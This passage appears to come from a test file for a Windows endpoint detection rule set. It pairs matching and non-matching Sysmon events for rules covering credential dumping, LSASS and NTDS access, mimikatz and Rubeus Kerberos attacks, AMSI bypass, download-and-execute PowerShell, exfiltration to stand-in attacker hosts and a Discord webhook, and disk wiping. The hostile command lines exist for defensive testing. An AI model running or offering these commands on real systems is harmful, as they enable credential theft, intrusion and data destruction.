    # --- SYS-108 through SYS-123: a second gap-coverage pass, targeting
    # credential-hive access, additional injection/proxy-execution LOLBAS,
    # AD reconnaissance and Kerberoasting tooling, logging-evasion tricks,
    # and a persistence mechanism (COM hijack) the corpus had no rule for. ---
    (
        "SYS-108",
        True,
        event(
            1,
            image=r"C:\Windows\System32\reg.exe",
            command_line=r"reg.exe save HKLM\SAM C:\Temp\sam.hive",
        ),
    ),
    (
        "SYS-108",
        False,
        event(
            1,
            image=r"C:\Windows\System32\reg.exe",
            command_line=r"reg.exe query HKLM\Software",
        ),
    ),
    (
        "SYS-109",
        True,
        event(
            1,
            image=r"C:\Users\bob\Downloads\procdump64.exe",
            command_line=r"procdump64.exe -ma lsass.exe C:\temp\out.dmp",
        ),
    ),
    (
        "SYS-109",
        False,
        event(
            1,
            image=r"C:\Users\bob\Downloads\procdump64.exe",
            command_line=r"procdump64.exe -ma notepad.exe out.dmp",
        ),
    ),
    (
        "SYS-110",
        True,
        event(
            1,
            image=r"C:\Windows\System32\ntdsutil.exe",
            command_line=r'ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q',
        ),
    ),
    (
        "SYS-110",
        False,
        event(1, image=r"C:\Windows\System32\ntdsutil.exe", command_line="ntdsutil ?"),
    ),
    (
        "SYS-111",
        True,
        event(
            1,
            image=r"C:\Windows\System32\mavinject.exe",
            command_line=r"mavinject.exe 4212 /INJECTRUNNING C:\evil.dll",
        ),
    ),
    (
        "SYS-111",
        False,
        event(1, image=r"C:\Windows\System32\mavinject.exe", command_line="mavinject.exe /HELP"),
    ),
    (
        "SYS-112",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wsl.exe",
            command_line='wsl.exe -e /bin/bash -c "curl http://evil"',
        ),
    ),
    (
        "SYS-112",
        False,
        event(1, image=r"C:\Windows\System32\wsl.exe", command_line="wsl.exe --list --verbose"),
    ),
    (
        "SYS-113",
        True,
        event(
            1,
            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
            command_line=r"MSBuild.exe C:\Users\bob\AppData\Local\Temp\evil.csproj",
        ),
    ),
    (
        "SYS-113",
        False,
        event(
            1,
            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
            command_line=r"MSBuild.exe C:\Repos\MyApp\MyApp.csproj",
        ),
    ),
    (
        "SYS-114",
        True,
        event(
            1,
            image=r"C:\Windows\System32\forfiles.exe",
            command_line=r"forfiles.exe /p C:\Users\bob\AppData\Local\Temp /c calc.exe",
        ),
    ),
    (
        "SYS-114",
        False,
        event(
            1,
            image=r"C:\Windows\System32\forfiles.exe",
            command_line=r"forfiles.exe /p C:\Logs /s /m *.log /c cmd /c del @file",
        ),
    ),
    (
        "SYS-115",
        True,
        event(1, image=r"C:\Windows\System32\tscon.exe", command_line="tscon.exe 3 /dest:rdp-tcp#1"),
    ),
    (
        "SYS-115",
        False,
        event(1, image=r"C:\Windows\System32\tscon.exe", command_line="tscon.exe /query"),
    ),
    (
        "SYS-116",
        True,
        event(1, image=r"C:\Users\bob\Downloads\SharpHound.exe", command_line="SharpHound.exe -c All"),
    ),
    (
        "SYS-116",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
    ),
    (
        "SYS-117",
        True,
        event(
            1,
            image=r"C:\Users\bob\Downloads\rclone.exe",
            command_line=r"rclone.exe copy C:\Data remote:backup",
        ),
    ),
    (
        "SYS-117",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
    ),
    (
        "SYS-118",
        True,
        event(1, image=r"C:\Users\bob\Rubeus.exe", command_line="Rubeus.exe kerberoast /outfile:hashes.txt"),
    ),
    (
        "SYS-118",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
    ),
    (
        "SYS-119",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -version 2 -nop -c whoami",
        ),
    ),
    (
        "SYS-119",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -nop -c whoami",
        ),
    ),
    (
        "SYS-120",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        ),
    ),
    (
        "SYS-120",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -c Get-Process",
        ),
    ),
    (
        "SYS-121",
        True,
        event(
            1,
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line=r"bitsadmin.exe /transfer job http://evil/x.exe C:\temp\x.exe",
        ),
    ),
    (
        "SYS-121",
        False,
        event(1, image=r"C:\Windows\System32\bitsadmin.exe", command_line="bitsadmin.exe /list"),
    ),
    (
        "SYS-122",
        True,
        event(
            13,
            TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
            Details=r"C:\Users\bob\evil.dll",
            EventType="SetValue",
        ),
    ),
    (
        "SYS-122",
        False,
        event(
            13,
            TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\LocalServer32",
            Details=r"C:\Program Files\App\app.exe",
            EventType="SetValue",
        ),
    ),
    (
        "SYS-123",
        True,
        event(1, image=r"C:\Users\bob\JuicyPotato.exe", command_line="JuicyPotato.exe -l 1337 -p cmd.exe"),
    ),
    (
        "SYS-123",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
    ),
    # --- DNS query to a dynamic DNS domain (SYS-124) ---
    ("SYS-124", True, event(22, QueryName="beacon.duckdns.org")),
    ("SYS-124", False, event(22, QueryName="www.google.com")),
    # --- Self-cleanup: executable deleted from a staging path (SYS-125) ---
    (
        "SYS-125",
        True,
        event(
            23,
            IsExecutable="true",
            TargetFilename=r"C:\Users\bob\AppData\Local\Temp\payload.exe",
        ),
    ),
    (
        "SYS-125",
        False,
        event(
            23,
            IsExecutable="false",
            TargetFilename=r"C:\Users\bob\AppData\Local\Temp\notes.txt",
        ),
    ),
    (
        "SYS-125",
        False,
        event(23, IsExecutable="true", TargetFilename=r"C:\Program Files\App\app.exe"),
    ),
    # --- Process tampering: hollowing / doppelganging (SYS-126) ---
    ("SYS-126", True, event(25, Type="Image is locked for access")),
    ("SYS-126", True, event(25, Type="Process Doppelganging")),
    # --- Executable staged inside an alternate data stream (SYS-127) ---
    (
        "SYS-127",
        True,
        event(15, TargetFilename=r"C:\Users\bob\Downloads\invoice.pdf:payload.exe"),
    ),
    (
        "SYS-127",
        False,
        event(15, TargetFilename=r"C:\Users\bob\Downloads\invoice.pdf:Zone.Identifier"),
    ),
    # --- Raw volume access outside known disk utilities (SYS-128) ---
    (
        "SYS-128",
        True,
        event(9, Device=r"\Device\HarddiskVolume2", image=r"C:\Users\bob\rawcopy.exe"),
    ),
    (
        "SYS-128",
        False,
        event(
            9,
            Device=r"\Device\HarddiskVolume2",
            image=r"C:\Windows\System32\vssadmin.exe",
        ),
    ),
    # --- Timestomping: file creation time backdated (SYS-129) ---
    (
        "SYS-129",
        True,
        event(
            2,
            image=r"C:\Users\bob\timestomp.exe",
            TargetFilename=r"C:\Windows\System32\evil.dll",
        ),
    ),
    ("SYS-129", False, event(2, image=r"C:\Windows\System32\msiexec.exe")),
    # --- DCSync-style directory replication request (SYS-130) ---
    (
        "SYS-130",
        True,
        event(
            1,
            image=r"C:\Users\bob\mimikatz.exe",
            command_line='mimikatz.exe "lsadump::dcsync /user:krbtgt"',
        ),
    ),
    (
        "SYS-130",
        False,
        event(1, image=r"C:\Windows\System32\net.exe", command_line="net user"),
    ),
    # --- Command line references a known Mimikatz module (SYS-131) ---
    (
        "SYS-131",
        True,
        event(
            1,
            image=r"C:\Users\bob\mimikatz.exe",
            command_line='mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
        ),
    ),
    (
        "SYS-131",
        False,
        event(1, image=r"C:\Windows\System32\whoami.exe", command_line="whoami /priv"),
    ),
    # --- Odbcconf proxy execution (SYS-132) ---
    (
        "SYS-132",
        True,
        event(
            1,
            image=r"C:\Windows\System32\odbcconf.exe",
            command_line='odbcconf.exe /A {REGSVR "evil.dll"}',
        ),
    ),
    (
        "SYS-132",
        False,
        event(
            1,
            image=r"C:\Windows\System32\odbcconf.exe",
            command_line='odbcconf.exe /a "myapp.dsn"',
        ),
    ),
    # --- mmc.exe loading a staged .msc (SYS-133) ---
    (
        "SYS-133",
        True,
        event(
            1,
            image=r"C:\Windows\System32\mmc.exe",
            command_line=r"mmc.exe C:\Users\bob\AppData\Local\Temp\evil.msc",
        ),
    ),
    (
        "SYS-133",
        False,
        event(
            1,
            image=r"C:\Windows\System32\mmc.exe",
            command_line=r"mmc.exe C:\Windows\System32\compmgmt.msc",
        ),
    ),
    # --- Non-browser process touched a browser credential DB (SYS-135) ---
    (
        "SYS-135",
        True,
        event(
            11,
            image=r"C:\Windows\System32\cmd.exe",
            TargetFilename=r"C:\Users\bob\AppData\Local\Temp\Login Data",
        ),
    ),
    (
        "SYS-135",
        False,
        event(
            11,
            image=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            TargetFilename=r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        ),
    ),
    # --- Script interpreter touched a KeePass database (SYS-136) ---
    (
        "SYS-136",
        True,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetFilename=r"C:\Users\bob\Documents\passwords.kdbx",
        ),
    ),
    (
        "SYS-136",
        False,
        event(
            11,
            image=r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
            TargetFilename=r"C:\Users\bob\Documents\passwords.kdbx",
        ),
    ),
    # --- Browser credential DB written into a staging directory (SYS-137) ---
    (
        "SYS-137",
        True,
        event(11, TargetFilename=r"C:\Users\bob\AppData\Local\Temp\Login Data"),
    ),
    (
        "SYS-137",
        False,
        event(
            11,
            TargetFilename=r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        ),
    ),
    # --- Network configuration discovery command (SYS-138) ---
    (
        "SYS-138",
        True,
        event(1, image=r"C:\Windows\System32\ipconfig.exe", command_line="ipconfig /all"),
    ),
    (
        "SYS-138",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe report.txt"),
    ),
    # --- Active connections enumerated via netstat -ano (SYS-139) ---
    (
        "SYS-139",
        True,
        event(1, image=r"C:\Windows\System32\netstat.exe", command_line="netstat -ano"),
    ),
    (
        "SYS-139",
        False,
        event(1, image=r"C:\Windows\System32\netstat.exe", command_line="netstat -r"),
    ),
    # --- Recursive filesystem enumeration (SYS-140) ---
    (
        "SYS-140",
        True,
        event(1, image=r"C:\Windows\System32\cmd.exe", command_line=r"cmd.exe /c dir /s C:\Users"),
    ),
    (
        "SYS-140",
        False,
        event(1, image=r"C:\Windows\System32\cmd.exe", command_line=r"cmd.exe /c dir C:\Users"),
    ),
    # --- Security/EDR product enumerated from the command line (SYS-141) ---
    (
        "SYS-141",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            command_line='tasklist | findstr /i "sentinelone"',
        ),
    ),
    (
        "SYS-141",
        False,
        event(1, image=r"C:\Windows\System32\cmd.exe", command_line="tasklist"),
    ),
    # --- Archive created with header/file-list encryption (SYS-142) ---
    (
        "SYS-142",
        True,
        event(
            1,
            image=r"C:\Program Files\7-Zip\7z.exe",
            command_line=r"7z.exe a -mhe -pS3cr3t archive.7z C:\Users\bob\Documents",
        ),
    ),
    (
        "SYS-142",
        False,
        event(
            1,
            image=r"C:\Program Files\7-Zip\7z.exe",
            command_line=r"7z.exe a archive.7z C:\Users\bob\Documents",
        ),
    ),
    # --- Rclone copy/sync/move against a remote destination (SYS-143) ---
    (
        "SYS-143",
        True,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\rclone.exe",
            command_line=r"rclone.exe copy C:\Users\bob\Documents remote:backup",
        ),
    ),
    (
        "SYS-143",
        False,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\rclone.exe",
            command_line="rclone.exe version",
        ),
    ),
    # --- Command-line file upload to a remote server (SYS-144) ---
    (
        "SYS-144",
        True,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line=r"curl.exe -T C:\Users\bob\Documents\secrets.zip https://evil.example.com/upload",
        ),
    ),
    (
        "SYS-144",
        False,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line="curl.exe https://example.com/file.zip -o file.zip",
        ),
    ),
    # --- SharpHound invoked via script or collection arguments (SYS-148) ---
    (
        "SYS-148",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                "powershell -c IEX (New-Object Net.WebClient).DownloadString("
                "'http://x/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
            ),
        ),
    ),
    (
        "SYS-148",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -c Get-Process",
        ),
    ),
    # --- AD account/group enumeration via built-in commands (SYS-149) ---
    (
        "SYS-149",
        True,
        event(1, image=r"C:\Windows\System32\net.exe", command_line="net user /domain"),
    ),
    (
        "SYS-149",
        False,
        event(1, image=r"C:\Windows\System32\net.exe", command_line=r"net use \\server\share"),
    ),
    # --- AS-REP roasting tooling (SYS-150) ---
    (
        "SYS-150",
        True,
        event(
            1,
            image=r"C:\Users\bob\impacket\GetNPUsers.py",
            command_line="GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat",
        ),
    ),
    (
        "SYS-150",
        False,
        event(1, image=r"C:\Windows\System32\whoami.exe", command_line="whoami"),
    ),
    # --- ClickFix/FileFix decoy verification lure pasted from Explorer (SYS-151) ---
    (
        "SYS-151",
        True,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                r'powershell -w hidden -c "iwr http://evil.example/x.ps1|iex"'
                "      # Verification ID: 4471-AXQ - I am not a robot, please wait..."
            ),
        ),
    ),
    (
        "SYS-151",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -File deploy.ps1",
        ),
    ),
    # --- PowerShell from Explorer with bypass + hidden window (SYS-152) ---
    (
        "SYS-152",
        True,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                "powershell.exe -ep bypass -w hidden -c IEX(New-Object "
                "Net.WebClient).DownloadString('http://evil.example/a.ps1')"
            ),
        ),
    ),
    (
        "SYS-152",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -ep bypass -File deploy.ps1",
        ),
    ),
    # --- Script host from Explorer immediately fetching remote code (SYS-153) ---
    (
        "SYS-153",
        True,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\mshta.exe",
            command_line="mshta.exe http://evil.example/payload.hta",
        ),
    ),
    (
        "SYS-153",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\notepad.exe",
            command_line=r"notepad.exe C:\Users\bob\notes.txt",
        ),
    ),
    # --- PowerShell reads and executes clipboard contents (SYS-154) ---
    (
        "SYS-154",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line='powershell -c "iex (Get-Clipboard | Out-String)"',
        ),
    ),
    (
        "SYS-154",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -c Get-Process",
        ),
    ),
    # --- RMM/remote-access tool launched from a non-Explorer parent (SYS-155) ---
    (
        "SYS-155",
        True,
        event(
            1,
            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            image=r"C:\Users\bob\AppData\Local\Temp\AnyDesk.exe",
            command_line=r"AnyDesk.exe",
        ),
    ),
    (
        "SYS-155",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
            command_line=r"AnyDesk.exe",
        ),
    ),
    # --- RMM/remote-access tool installed with a silent flag (SYS-156) ---
    (
        "SYS-156",
        True,
        event(
            1,
            image=r"C:\Users\bob\Downloads\AnyDesk.exe",
            command_line="AnyDesk.exe --install --silent --start-with-win",
        ),
    ),
    (
        "SYS-156",
        False,
        event(
            1,
            image=r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
            command_line="TeamViewer.exe",
        ),
    ),
    # --- PowerShell reads and overwrites the clipboard (SYS-157) ---
    (
        "SYS-157",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                'powershell -c "$c=Get-Clipboard; Set-Clipboard -Value $wallet; '
                'Invoke-WebRequest -Uri http://evil.example/x -Body $c"'
            ),
        ),
    ),
    (
        "SYS-157",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line='powershell -c "iex (Get-Clipboard | Out-String)"',
        ),
    ),
    # --- psr.exe abused for silent screen capture (SYS-158) ---
    (
        "SYS-158",
        True,
        event(
            1,
            image=r"C:\Windows\System32\psr.exe",
            command_line=r"psr.exe /start /gui 0 /output C:\Users\bob\AppData\Local\Temp\out.zip",
        ),
    ),
    (
        "SYS-158",
        False,
        event(1, image=r"C:\Windows\System32\psr.exe", command_line="psr.exe /stop"),
    ),
    # --- Chat-service webhook/bot API used as a covert channel (SYS-159) ---
    (
        "SYS-159",
        True,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line=(
                r'curl.exe -X POST -F "file=@C:\loot.zip" '
                r"https://discord.com/api/webhooks/1234567890/AbCdEfGhIjK"
            ),
        ),
    ),
    (
        "SYS-159",
        False,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line="curl.exe https://example.com/api/webhooks/foo",
        ),
    ),
    # --- Public paste service used as a C2 dead-drop (SYS-160) ---
    (
        "SYS-160",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                'powershell -c "IEX (New-Object Net.WebClient).DownloadString'
                "('https://pastebin.com/raw/AbCdEfGh')\""
            ),
        ),
    ),
    (
        "SYS-160",
        False,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line="curl.exe https://pastebin.com/raw/AbCdEfGh -o notes.txt",
        ),
    ),
    # --- Archive utility packaged a broad user data directory (SYS-161) ---
    (
        "SYS-161",
        True,
        event(
            1,
            image=r"C:\Program Files\7-Zip\7z.exe",
            command_line=r"7z.exe a C:\Windows\Temp\backup.7z C:\Users\bob\Documents",
        ),
    ),
    (
        "SYS-161",
        False,
        event(
            1,
            image=r"C:\Program Files\7-Zip\7z.exe",
            command_line=r"7z.exe a C:\Windows\Temp\logs.7z C:\ProgramData\App\logs",
        ),
    ),
    # --- robocopy mass-mirrored a broad user directory tree (SYS-162) ---
    (
        "SYS-162",
        True,
        event(
            1,
            image=r"C:\Windows\System32\robocopy.exe",
            command_line=r"robocopy.exe C:\Users\bob\Documents \\45.132.192.68\share\loot /MIR",
        ),
    ),
    (
        "SYS-162",
        False,
        event(
            1,
            image=r"C:\Windows\System32\robocopy.exe",
            command_line=r"robocopy.exe C:\Users\bob\Documents D:\backup",
        ),
    ),
    # --- Rubeus used to pass or renew a Kerberos ticket (SYS-163) ---
    (
        "SYS-163",
        True,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\Rubeus.exe",
            command_line=r"Rubeus.exe ptt /ticket:doIFvjCCBbqgAwIBBaEDAgEW",
        ),
    ),
    (
        "SYS-163",
        False,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\Rubeus.exe",
            command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        ),
    ),
    # --- Mimikatz used to pass a hash or ticket (SYS-164) ---
    (
        "SYS-164",
        True,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\mimikatz.exe",
            command_line=(
                'mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local '
                '/ntlm:aad3b435b51404eeaad3b435b51404ee"'
            ),
        ),
    ),
    (
        "SYS-164",
        False,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\mimikatz.exe",
            command_line='mimikatz.exe "sekurlsa::logonpasswords"',
        ),
    ),
    # --- Known GPO-abuse tooling or cmdlet invoked (SYS-165) ---
    (
        "SYS-165",
        True,
        event(
            1,
            image=r"C:\Users\bob\AppData\Local\Temp\SharpGPOAbuse.exe",
            command_line=(
                'SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" '
                '--GPOName "Default Domain Policy"'
            ),
        ),
    ),
    (
        "SYS-165",
        False,
        event(1, image=r"C:\Windows\System32\gpupdate.exe", command_line="gpupdate /force"),
    ),
    # --- Domain trust modified to disable SID-filtering (SYS-166) ---
    (
        "SYS-166",
        True,
        event(
            1,
            image=r"C:\Windows\System32\netdom.exe",
            command_line=(
                "netdom trust corp.local /domain:partner.local /EnableSIDHistory:yes"
            ),
        ),
    ),
    (
        "SYS-166",
        False,
        event(
            1,
            image=r"C:\Windows\System32\netdom.exe",
            command_line="netdom trust corp.local /domain:partner.local /add",
        ),
    ),
    # --- Command-line destructive wipe (SYS-167) ---
    (
        "SYS-167",
        True,
        event(1, image=r"C:\Windows\System32\format.com", command_line="format.com D: /y /q"),
    ),
    (
        "SYS-167",
        False,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            command_line=r"cmd.exe /c del C:\Users\bob\Documents\notes.txt",
        ),
    ),
    # --- PowerShell bulk-disabled or reset AD accounts (SYS-168) ---
    (
        "SYS-168",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line='powershell -c "Get-ADUser -Filter * | Disable-ADAccount"',
        ),
    ),
    (
        "SYS-168",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line='powershell -c "Get-ADUser -Identity jdoe | Disable-ADAccount"',
        ),
    ),
    # --- Script interpreter staged a cloud CLI credential file (SYS-169) ---
    (
        "SYS-169",
        True,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetFilename=r"C:\Users\bob\.aws\credentials",
        ),
    ),
    (
        "SYS-169",
        False,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetFilename=r"C:\Users\bob\Documents\notes.txt",
        ),
    ),
    # --- Cloud instance metadata service queried by a non-agent process (SYS-170) ---
    (
        "SYS-170",
        True,
        event(
            1,
            image=r"C:\Windows\System32\curl.exe",
            command_line="curl.exe http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
    ),
    (
        "SYS-170",
        False,
        event(1, image=r"C:\Windows\System32\curl.exe", command_line="curl.exe https://example.com"),
    ),
    # --- Script interpreter staged an SSH or PuTTY private key (SYS-171) ---
    (
        "SYS-171",
        True,
        event(
            11,
            image=r"C:\Windows\System32\cmd.exe",
            TargetFilename=r"C:\Users\bob\AppData\Local\Temp\id_rsa",
        ),
    ),
    (
        "SYS-171",
        False,
        event(
            11,
            image=r"C:\Windows\System32\OpenSSH\ssh.exe",
            TargetFilename=r"C:\Users\bob\.ssh\id_rsa",
        ),
    ),
    # --- WMI used to create a process via Win32_Process (SYS-172) ---
    (
        "SYS-172",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wbem\WMIC.exe",
            command_line='wmic /node:10.0.0.5 process call create "cmd.exe /c whoami"',
        ),
    ),
    (
        "SYS-172",
        False,
        event(1, image=r"C:\Windows\System32\wbem\WMIC.exe", command_line="wmic process list brief"),
    ),
    # --- mmc.exe spawned a shell consistent with MMC20.Application DCOM abuse (SYS-173) ---
    (
        "SYS-173",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\System32\mmc.exe",
            command_line="cmd.exe /c whoami",
        ),
    ),
    (
        "SYS-173",
        False,
        event(
            1,
            image=r"C:\Windows\System32\mmc.exe",
            parent_image=r"C:\Windows\explorer.exe",
            command_line="mmc.exe",
        ),
    ),
    # --- Docker container launched with --privileged (SYS-174) ---
    (
        "SYS-174",
        True,
        event(
            1,
            image=r"C:\Program Files\Docker\Docker\resources\bin\docker.exe",
            command_line="docker.exe run --rm --privileged alpine sh",
        ),
    ),
    (
        "SYS-174",
        False,
        event(
            1,
            image=r"C:\Program Files\Docker\Docker\resources\bin\docker.exe",
            command_line="docker.exe run --rm alpine sh",
        ),
    ),
    # --- Accessibility binary replaced on disk (SYS-175) ---
    (
        "SYS-175",
        True,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetFilename=r"C:\Windows\System32\sethc.exe",
        ),
    ),
    (
        "SYS-175",
        False,
        event(
            11,
            image=r"C:\Windows\servicing\TrustedInstaller.exe",
            TargetFilename=r"C:\Windows\System32\notepad.exe",
        ),
    ),
    # --- Winlogon helper DLL persistence key set (SYS-176) ---
    (
        "SYS-176",
        True,
        event(
            13,
            image=r"C:\Windows\System32\lsass.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        ),
    ),
    (
        "SYS-176",
        False,
        event(
            13,
            image=r"C:\Windows\System32\lsass.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText",
        ),
    ),
    # --- Security Support Provider registered (SYS-177) ---
    (
        "SYS-177",
        True,
        event(
            13,
            image=r"C:\Windows\System32\lsass.exe",
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages",
        ),
    ),
    (
        "SYS-177",
        False,
        event(
            13,
            image=r"C:\Windows\System32\lsass.exe",
            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Auditing",
        ),
    ),
    # --- Active Setup StubPath persistence key set (SYS-178) ---
    (
        "SYS-178",
        True,
        event(
            13,
            image=r"C:\Windows\System32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}\StubPath",
        ),
    ),
    (
        "SYS-178",
        False,
        event(
            13,
            image=r"C:\Windows\System32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
        ),
    ),
    # --- Domain account created (SYS-179) ---
    (
        "SYS-179",
        True,
        event(
            1,
            image=r"C:\Windows\System32\net.exe",
            command_line="net user hacker P@ss12345! /add /domain",
        ),
    ),
    (
        "SYS-179",
        False,
        event(
            1,
            image=r"C:\Windows\System32\net.exe",
            command_line="net user hacker P@ss12345! /add",
        ),
    ),
    # --- Boot configured into Safe Mode (SYS-180) ---
    (
        "SYS-180",
        True,
        event(
            1,
            image=r"C:\Windows\System32\bcdedit.exe",
            command_line="bcdedit /set {default} safeboot minimal",
        ),
    ),
    (
        "SYS-180",
        False,
        event(1, image=r"C:\Windows\System32\bcdedit.exe", command_line="bcdedit /enum"),
    ),
    # --- Windows Event Log service or channel disabled (SYS-181) ---
    (
        "SYS-181",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wevtutil.exe",
            command_line="wevtutil.exe sl Security /e:false",
        ),
    ),
    (
        "SYS-181",
        False,
        event(1, image=r"C:\Windows\System32\sc.exe", command_line="sc query eventlog"),
    ),
    # --- Disk image mounted via PowerShell (SYS-182) ---
    (
        "SYS-182",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"Mount-DiskImage -ImagePath C:\Users\bob\Downloads\invoice.iso",
        ),
    ),
    (
        "SYS-182",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="Get-Volume",
        ),
    ),
    # --- Mimikatz used to dump LSA secrets or cached domain credentials (SYS-183) ---
    (
        "SYS-183",
        True,
        event(1, image=r"C:\tools\mimikatz.exe", command_line='mimikatz.exe "lsadump::cache" exit'),
    ),
    (
        "SYS-183",
        False,
        event(
            1,
            image=r"C:\tools\mimikatz.exe",
            command_line='mimikatz.exe "sekurlsa::logonpasswords" exit',
        ),
    ),
    # --- Mimikatz used to forge a Kerberos golden ticket (SYS-184) ---
    (
        "SYS-184",
        True,
        event(
            1,
            image=r"C:\tools\mimikatz.exe",
            command_line='mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1 /krbtgt:aabb /ptt" exit',
        ),
    ),
    (
        "SYS-184",
        False,
        event(1, image=r"C:\tools\mimikatz.exe", command_line='mimikatz.exe "kerberos::ptt ticket.kirbi" exit'),
    ),
    # --- File written with a double extension masking an executable (SYS-185) ---
    (
        "SYS-185",
        True,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetFilename=r"C:\Users\bob\Downloads\invoice.pdf.exe",
        ),
    ),
    (
        "SYS-185",
        False,
        event(
            11,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
